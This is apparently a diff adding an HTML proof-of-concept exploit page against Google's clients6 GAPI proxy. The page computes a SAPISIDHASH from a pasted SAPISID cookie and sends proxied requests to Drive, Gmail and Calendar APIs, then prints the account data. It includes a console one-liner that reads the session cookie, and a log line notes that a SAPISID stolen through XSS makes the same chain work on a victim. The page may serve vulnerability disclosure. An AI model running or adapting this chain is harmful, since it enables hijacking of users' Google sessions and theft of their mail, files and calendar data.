@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>clients6 GAPI Proxy — SAPISIDHASH Auth Proof</title>
+<style>
+body { font-family: monospace; background: #0d0d0d; color: #00ff88; margin: 20px; }
+h2 { color: #ff4444; }
+.warn { color: #ffaa00; }
+.ok { color: #00ff88; }
+.data { color: #44aaff; word-break: break-all; }
+.crit { color: #ff4444; font-weight: bold; }
+pre { background: #1a1a1a; padding: 10px; border-left: 3px solid #333; overflow-x: auto; white-space: pre-wrap; }
+#log { max-height: 500px; overflow-y: auto; }
+#results { margin-top: 20px; }
+input { background: #1a1a1a; color: #00ff88; border: 1px solid #444; padding: 5px; width: 100%; font-family: monospace; margin: 4px 0; }
+button { background: #ff4444; color: #fff; border: none; padding: 8px 18px; cursor: pointer; font-family: monospace; margin: 5px 4px; font-size: 1em; }
+.section { border: 1px solid #333; padding: 12px; margin: 12px 0; }
+code { color: #ffaa00; }
+</style>
+</head>
+<body>
+
+<h2>clients6.google.com GAPI Proxy — SAPISIDHASH Authenticated Access Proof</h2>
+
+<div class="section">
+<p class="warn"><b>Why this works:</b></p>
+<ul>
+<li><code>Authorization</code> is in the proxy's <code>Xg</code> allowed-headers list → forwarded verbatim</li>
+<li><code>SAPISIDHASH = SHA256(timestamp + " " + SAPISID)</code> — we compute it in JS</li>
+<li>Proxy sends <code>Authorization: SAPISIDHASH ts_hash</code> + victim's session cookies to Drive API</li>
+<li>Drive API gets valid cookie-based user auth → 200</li>
+</ul>
+<p class="warn"><b>Self-test:</b> Get your own SAPISID — open DevTools on <code>google.com</code>, run:
+<pre style="margin:4px 0"><code>document.cookie.match(/SAPISID=([^;]+)/)?.[1]</code></pre>
+Paste the value below and click Run Test.
+</p>
+</div>
+
+<label>SAPISID value (just the value, not the name):
+<input id="sapisid" placeholder="Paste SAPISID value here — e.g. XXXXXXXXXXXXXXXXXX/YYYYY..." />
+</label>
+
+<button onclick="runTest()">Run Authenticated Test</button>
+<button onclick="runTest(true)">Run Without SAPISIDHASH (expect 401)</button>
+
+<hr>
+<div id="log"></div>
+<div id="results"></div>
+
+<script>
+const logEl = document.getElementById('log');
+function log(cls, msg) {
+  const d = document.createElement('pre');
+  d.className = cls;
+  d.textContent = '[' + new Date().toISOString().slice(11,23) + '] ' + msg;
+  logEl.prepend(d);
+  console.log(cls.toUpperCase(), msg);
+}
+
+async function computeSapisidhash(sapisid) {
+  const ts = Math.floor(Date.now() / 1000);
+  const data = new TextEncoder().encode(ts + ' ' + sapisid);
+  const hashBuf = await crypto.subtle.digest('SHA-256', data);
+  const hashHex = Array.from(new Uint8Array(hashBuf))
+    .map(b => b.toString(16).padStart(2, '0')).join('');
+  return { ts, header: 'SAPISIDHASH ' + ts + '_' + hashHex };
+}
+
+let requestSent = false;
+let responseHandled = false;
+let proxyIframe = null;
+
+async function runTest(noAuth) {
+  requestSent = false;
+  responseHandled = false;
+  logEl.innerHTML = '';
+  document.getElementById('results').innerHTML = '';
+
+  const sapisid = document.getElementById('sapisid').value.trim();
+
+  if (!noAuth && !sapisid) {
+    log('warn', 'Enter your SAPISID value first.');
+    return;
+  }
+
+  let authHeader = null;
+  if (!noAuth && sapisid) {
+    const { ts, header } = await computeSapisidhash(sapisid);
+    authHeader = header;
+    log('ok', 'Computed: ' + header.substring(0, 80) + '...');
+    log('ok', 'Timestamp: ' + ts + ' (will match Google server within ~300s window)');
+  } else {
+    log('warn', 'Skipping SAPISIDHASH — expect 401 (confirms 200 with auth = full chain)');
+  }
+
+  if (typeof gapi !== 'undefined' || document.querySelector('script[src*="apis.google.com"]')) {
+    log('warn', '⚠️  GAPI contamination detected — run from fresh tab');
+  }
+
+  const rpcToken = 'sapi' + Math.random().toString(36).substr(2, 12);
+  const parentOrigin = location.origin;
+
+  if (proxyIframe) proxyIframe.remove();
+  proxyIframe = document.createElement('iframe');
+  proxyIframe.style.cssText = 'display:none;width:1px;height:1px;';
+  proxyIframe.src = 'https://clients6.google.com/static/proxy.html?usegapi=1' +
+    '#parent=' + encodeURIComponent(parentOrigin) +
+    '&rpctoken=' + rpcToken +
+    '&origin=' + encodeURIComponent(parentOrigin);
+  document.body.appendChild(proxyIframe);
+  log('ok', 'Proxy iframe injected, rpcToken=' + rpcToken);
+
+  const requests = [
+    {
+      key: 'drive-about',
+      params: {
+        url: '/drive/v3/about?fields=user,storageQuota',
+        httpMethod: 'GET',
+        headers: authHeader ? { 'Authorization': authHeader } : {},
+        body: null
+      }
+    },
+    {
+      key: 'gmail-profile',
+      params: {
+        url: '/gmail/v1/users/me/profile',
+        httpMethod: 'GET',
+        headers: authHeader ? { 'Authorization': authHeader } : {},
+        body: null
+      }
+    },
+    {
+      key: 'calendar-list',
+      params: {
+        url: '/calendar/v3/users/me/calendarList?maxResults=5',
+        httpMethod: 'GET',
+        headers: authHeader ? { 'Authorization': authHeader } : {},
+        body: null
+      }
+    }
+  ];
+
+  window.addEventListener('message', function handler(e) {
+    if (e.source !== proxyIframe.contentWindow) return;
+    const raw = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
+    if (raw.length < 500) log('data', 'PROXY→PARENT: ' + raw);
+
+    let msg;
+    try { msg = JSON.parse(e.data); } catch(err) { return; }
+    if (!msg) return;
+
+    if (msg.s && msg.s.startsWith('ready:') && !requestSent) {
+      log('ok', 'Ready. Sending makeHttpRequests with' + (authHeader ? '' : 'OUT') + ' SAPISIDHASH...');
+      requestSent = true;
+      proxyIframe.contentWindow.postMessage(
+        JSON.stringify({
+          s: 'makeHttpRequests',
+          f: '..',
+          c: 'sapi-test-1',
+          a: [requests],
+          t: rpcToken,
+          l: null,
+          g: true
+        }),
+        'https://clients6.google.com'
+      );
+    }
+
+    if (msg.s !== '__cb') return;
+    if (responseHandled) return;
+    responseHandled = true;
+    log('ok', '__cb received, callId=' + msg.a[0]);
+
+    let responseMap;
+    try { responseMap = JSON.parse(msg.a[1]); } catch(e) {
+      log('warn', 'Parse failed: ' + String(msg.a[1]).substring(0, 200)); return;
+    }
+
+    let anySuccess = false;
+    Object.entries(responseMap).forEach(([key, wrapper]) => {
+      const status = wrapper.data && wrapper.data.status;
+      const bodyStr = wrapper.data && wrapper.data.body;
+      log(status === 200 ? 'crit' : 'warn', key + ' → HTTP ' + status);
+
+      if (status === 200) {
+        anySuccess = true;
+        let data;
+        try { data = JSON.parse(bodyStr); } catch(e) { data = { raw: bodyStr }; }
+
+        if (key === 'drive-about') {
+          log('crit', '✅ DRIVE ABOUT: ' + JSON.stringify(data.user));
+          log('crit', '   Storage: ' + data.storageQuota?.usage + ' / ' + data.storageQuota?.limit);
+        } else if (key === 'gmail-profile') {
+          log('crit', '✅ GMAIL PROFILE: ' + data.emailAddress + ' (' + data.messagesTotal + ' messages)');
+        } else if (key === 'calendar-list') {
+          const cals = data.items || [];
+          log('crit', '✅ CALENDAR: ' + cals.length + ' calendars');
+          cals.forEach(c => log('data', '  - ' + c.summary + ' (' + c.id + ')'));
+        }
+
+        const div = document.getElementById('results');
+        const block = document.createElement('div');
+        block.style = 'border:1px solid #ff4444;margin:8px 0;padding:10px;';
+        block.innerHTML = '<pre class="crit">✅ ' + key + ' (HTTP 200):\n' +
+          JSON.stringify(data, null, 2).substring(0, 2000) + '</pre>';
+        div.appendChild(block);
+      } else if (status === 401) {
+        log('warn', key + ': 401 — ' + String(bodyStr).substring(0, 200));
+        if (noAuth) log('ok', '(Expected 401 without auth — try "Run Authenticated Test" with SAPISID)');
+        else log('warn', '  → Check: SAPISID correct? Clock skew? Cookies blocked?');
+      } else if (status === 403) {
+        log('warn', key + ': 403 — ' + String(bodyStr).substring(0, 200));
+      } else {
+        log('warn', key + ': HTTP ' + status + ' — ' + String(bodyStr).substring(0, 200));
+      }
+    });
+
+    if (anySuccess) {
+      log('crit', '🎯 FULL CHAIN CONFIRMED: clients6 proxy → SAPISIDHASH → authenticated Google API access');
+      log('crit', '   In real attack: SAPISID exfiltrated from any *.google.com XSS → same chain works on victim');
+    }
+
+    window.removeEventListener('message', handler);
+  });
+
+  setTimeout(function() {
+    if (!requestSent) {
+      log('warn', '5s: No ready signal. Sending anyway (_.jf.register fires synchronously)...');
+      requestSent = true;
+      proxyIframe.contentWindow.postMessage(
+        JSON.stringify({ s: 'makeHttpRequests', f: '..', c: 'sapi-test-1', a: [requests], t: rpcToken, l: null, g: true }),
+        'https://clients6.google.com'
+      );
+    }
+  }, 5000);
+
+  setTimeout(function() {
+    if (!responseHandled) {
+      log('warn', '15s: No callback received.');
+      log('warn', '  Possible causes: GAPI contamination, proxy not loaded, clock skew > 300s');
+    }
+  }, 15000);
+}
+</script>
+</body>
+</html>
